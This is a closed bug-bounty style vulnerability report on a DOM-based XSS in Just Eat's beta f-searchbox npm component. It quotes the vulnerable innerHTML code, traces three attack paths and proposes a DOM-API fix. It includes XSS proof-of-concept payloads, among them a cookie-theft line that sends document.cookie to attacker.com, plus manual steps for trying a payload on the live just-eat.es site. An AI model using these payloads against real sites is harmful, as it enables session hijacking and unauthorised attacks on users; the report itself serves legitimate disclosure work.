# Security Report: DOM-based XSS in f-searchbox Component

**Status:** 🅿️ PARKED - Component not deployed to production. README explicitly says "DO NOT USE IN PRODUCTION". Vulnerability exists only in beta code with zero production impact.

**Report ID**: JET-001
**Date**: 2025-12-21
**Severity**: ~~Medium~~ → **None (Not in Production)**
**Status**: ❌ CLOSED - Component not deployed to production sites

---

## ❌ NOT REPORTABLE

**Manual testing on 2025-12-21 confirmed**:
- `f-searchbox` component is NOT used on https://www.just-eat.es
- No references to `fozzie` or `f-searchbox` in production JS bundles
- The README warning "DO NOT USE IN PRODUCTION" was followed

**Result**: Vulnerability exists in beta code but has zero production impact.

---

## Summary

A DOM-based Cross-Site Scripting (XSS) vulnerability exists in the `@justeat/f-searchbox` npm package. User input from the street number field flows directly to `innerHTML` without sanitization, allowing arbitrary JavaScript execution in the context of the Just Eat website.

---

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Type** | DOM-based XSS |
| **Package** | `@justeat/f-searchbox` |
| **Version** | 6.9.1 (and likely earlier versions) |
| **npm** | https://www.npmjs.com/package/@justeat/f-searchbox |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **CVSS** | Medium (5.4-6.1 depending on production usage) |

### Affected Locales / Attack Paths

**THREE separate attack paths identified:**

| Attack Path | Affected Locales | Trigger Condition |
|-------------|------------------|-------------------|
| **1. Street Number Input** | `es-ES` (Spain), `it-IT` (Italy) | `requiredFields` includes `streetNumber` |
| **2. Full Address Search** | ALL locales (especially `en-GB`) | Cookie `je-full-address-search-enabled=true` + `shouldAutoNavigateToSerp` |
| **3. Cookie Injection** | ALL locales | Attacker can set `je-location` or `je-last_*` cookies |

**Path 2 is particularly concerning** - it affects the UK (`en-GB`) which is Just Eat's primary market.

---

## Vulnerable Code

### Sink: `generatePostForm()` in helpers.js:71-84

```javascript
// fozzie-components/packages/components/molecules/f-searchbox/src/utils/helpers.js
const generatePostForm = (url, data) => {
    let html = '';
    const form = document.createElement('form');
    form.method = 'post';
    form.action = url;

    Object.keys(data).forEach(key => {
        // VULNERABILITY: No HTML escaping of user input!
        html += `<input name="${key}" value="${data[key] || ''}" />`;
    });

    form.innerHTML = html;  // XSS SINK
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
};
```

### Source 1: Street Number Input in FormSearchInnerFieldWrapper.vue:9-18

```vue
<input
    v-if="isStreetNumberRequired"
    ref="streetNumberInput"
    v-model="streetNumber"  <!-- USER INPUT -->
    data-test-id="streetNumberInput"
    :class="$style['c-search-streetInput']"
    type="input"
    placeholder="N°"
    :aria-label="copy.streetNumberLabel"
    @input="onStreetNumberEntered">
```

### Source 2: Address Input via Full Address Search Mixin

```javascript
// fullAddressSearch.mixin.js:30-35
const payload = {
    postcode: extractPostcode(this.address),  // User input!
    query
};
generatePostForm(formUrl, payload);  // XSS!

// extractPostcode in general.services.js:109-114
const extractPostcode = address => {
    try {
        return address.split(',')[0];  // NO SANITIZATION
    } catch (e) {
        return null;
    }
};
```

### Source 3: Cookie Values via getLastLocation()

```javascript
// helpers.js:55-68
const getLastLocation = () => window.document.cookie
    .split('; ')
    .reduce((location, data) => {
        const [name, value] = data.split('=');
        // Cookie values flow directly without sanitization
        if (prefix === 'je-last') {
            location[key] = value;  // Attacker-controlled if cookie set
        }
        // ...
    }, {});
```

---

## Attack Paths

### Path 1: Street Number Input (Spain/Italy only)
```
User Input (streetNumber field)
    ↓
FormSearchInnerFieldWrapper.vue (v-model="streetNumber")
    ↓
setStreetNumber() Vuex → selectedSuggestion()
    ↓
location.houseNo = location.streetNumber
    ↓
generatePostForm(url, payload)  →  form.innerHTML  // XSS!
```

### Path 2: Full Address Search (ALL locales - especially UK)
```
User Input (address field): "><script>alert(1)</script>, London
    ↓
extractPostcode(address)  →  returns first part before comma
    ↓
payload.postcode = "><script>alert(1)</script>"
    ↓
generatePostForm(formUrl, payload)  →  form.innerHTML  // XSS!
```
**Trigger condition**: Cookie `je-full-address-search-enabled=true` must be set

### Path 3: Cookie Injection (ALL locales - requires prior attack)
```
Attacker sets cookie: je-location="><script>alert(1)</script>
    ↓
getLastLocation() reads cookie value unsanitized
    ↓
search(searchPayload, location)
    ↓
generatePostForm(url, payload)  →  form.innerHTML  // XSS!
```

---

## Exploitation Conditions

### Path 1: Street Number (Spain/Italy)
| Condition | Requirement |
|-----------|-------------|
| Locale | `es-ES` or `it-IT` |
| Config | `onSubmit` NOT provided |
| User action | Enter malicious street number, submit form |

### Path 2: Full Address Search (UK and others)
| Condition | Requirement |
|-----------|-------------|
| Cookie | `je-full-address-search-enabled=true` |
| State | `shouldAutoNavigateToSerp=true` |
| Config | `onSubmit` NOT provided |
| User action | Enter malicious address with comma, select suggestion |

### Path 3: Cookie Injection
| Condition | Requirement |
|-----------|-------------|
| Pre-requisite | Ability to set cookies (subdomain XSS, CRLF, etc.) |
| Config | `onSubmit` NOT provided |
| User action | Submit any search |

---

## Proof of Concept

### POC 1: Street Number Field (Spain/Italy)

Enter this in the street number field when prompted:
```
"><img src=x onerror=alert(document.domain)><input value="
```

### POC 2: Full Address Search (UK)

Enter this in the address search field:
```
"><script>alert(document.domain)</script>, London
```

The `extractPostcode()` function takes everything before the first comma.

### Expected Result

When the form is submitted, the following HTML is generated:

```html
<input name="postcode" value=""><script>alert(document.domain)</script>" />
```

The `onerror` handler executes, displaying an alert with the current domain.

### Alternative Payloads

```javascript
// Cookie theft
"><img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"><input value="

// DOM manipulation
"><script>document.body.innerHTML='<h1>Phished!</h1>'</script><input value="
```

---

## Impact Assessment

| Impact | Severity | Description |
|--------|----------|-------------|
| Session Hijacking | High | Steal auth cookies if not HttpOnly |
| Credential Theft | High | Inject fake login forms |
| Malware Distribution | Medium | Redirect to malicious sites |
| Defacement | Low | Modify page content |
| Phishing | High | Display fake payment forms |

### Mitigating Factors

1. **Beta package**: README states "PLEASE DO NOT USE THE BETA VERSION OF THIS COMPONENT IN PRODUCTION YET"
2. **Limited locales**: Only affects Spain and Italy configurations
3. **User interaction required**: Victim must enter malicious payload themselves (or via URL parameter injection)
4. **Configuration dependent**: Many implementations may provide `onSubmit` callback

### Aggravating Factors

1. **Publicly published**: Package is on npm with public access
2. **Active development**: 202 versions published, last modified April 2025
3. **Production-like name**: `@justeat/f-searchbox` implies official production component
4. **Just Eat's main markets**: Spain and Italy are significant Just Eat markets

---

## Recommendations

### Immediate Fix

Replace string interpolation with DOM API:

```javascript
const generatePostForm = (url, data) => {
    const form = document.createElement('form');
    form.method = 'post';
    form.action = url;

    Object.keys(data).forEach(key => {
        const input = document.createElement('input');
        input.name = key;
        input.value = data[key] || '';  // Safe: uses DOM property, not innerHTML
        form.appendChild(input);
    });

    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
};
```

### Additional Recommendations

1. **Add Content-Security-Policy** to mitigate XSS impact
2. **Input validation** on street number field (alphanumeric only)
3. **Security audit** of other innerHTML/outerHTML usages in fozzie-components
4. **Remove beta warning** or clearly mark as not for production

---

## Bug Bounty Scope

**Program**: Just Eat Takeaway on Bugcrowd
**GitHub in Scope**: ✓ `https://github.com/justeattakeaway` explicitly listed
**Affected Domains in Scope**:
- `https://just-eat.es` (Spain - uses es-ES locale)
- `https://just-eat.it` (Italy - uses it-IT locale, if exists)

---

## Validation Status

**Remote validation BLOCKED** - Cloudflare bot protection prevents automated testing of:
- https://www.just-eat.es
- https://www.just-eat.co.uk

Screenshot evidence: `poc-inspect-searchbox.py` returns Cloudflare block page.

### Manual Testing Required

To validate, a human must:

1. **Open browser** to https://www.just-eat.es (Spain)
2. **Find the address search box** on homepage
3. **Enter a partial address** (e.g., "Calle Mayor, Madrid")
4. **Select a suggestion** that prompts for street number
5. **Enter XSS payload** in street number field: `"><img src=x onerror=alert(1)>`
6. **Submit** and observe if alert fires

### Alternative: Report Based on Code Analysis

Since GitHub (`github.com/justeattakeaway`) is explicitly in scope on Bugcrowd, the vulnerability can be reported based on:
- Source code analysis (documented above)
- Published npm package `@justeat/f-searchbox`
- Clear vulnerable data flow from user input to `innerHTML`

## Open Questions

- [ ] Is `f-searchbox` actually deployed on production sites?
- [ ] Do production implementations provide `onSubmit` callback?
- [x] ~~Check bug bounty scope~~ - GitHub repos ARE in scope on Bugcrowd
- [x] ~~Remote validation~~ - Blocked by Cloudflare

---

## Evidence Files

| File | Description |
|------|-------------|
| `001-f-searchbox-xss.md` | This report - full vulnerability analysis |
| `poc-inspect-searchbox.py` | Playwright script for automated testing |
| `cloudflare-block.png` | Screenshot showing Cloudflare blocking automated access |

---

## References

- Package: https://www.npmjs.com/package/@justeat/f-searchbox
- Repository: https://github.com/justeat/fozzie-components
- Vulnerable file: `packages/components/molecules/f-searchbox/src/utils/helpers.js`
- Input source: `packages/components/molecules/f-searchbox/src/components/formElements/FormSearchInnerFieldWrapper.vue`

---

## Timeline

| Date | Action |
|------|--------|
| 2025-12-21 | Vulnerability discovered via semgrep scan |
| 2025-12-21 | Code path analysis confirmed exploitability |
| TBD | Production verification |
| TBD | Bug bounty submission |
